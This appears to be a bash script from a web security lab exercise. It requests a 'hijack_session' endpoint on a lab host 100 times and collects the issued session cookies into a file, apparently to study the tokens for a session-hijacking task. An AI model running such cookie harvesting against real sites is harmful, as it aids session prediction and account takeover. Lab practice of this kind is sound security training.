#!/bin/bash

# Target URL
url="http://web0x01.hbtn/a1/hijack_session"

# Output file for cookies
output_file="cookies.txt"

# Clear the output file
> $output_file

# Loop to generate multiple sessions
for i in {1..100}; do
    # Use curl to fetch the URL and extract the cookie
    cookie=$(curl -L -I "$url" | grep "Set-Cookie: hijack_session" | sed -n 's/.*hijack_session=\([^;]*\).*/\1/p')
    
    # Print and save the cookie
    echo "Session $i: $cookie"
    echo "$cookie" >> $output_file
done

echo "Cookies saved to $output_file"
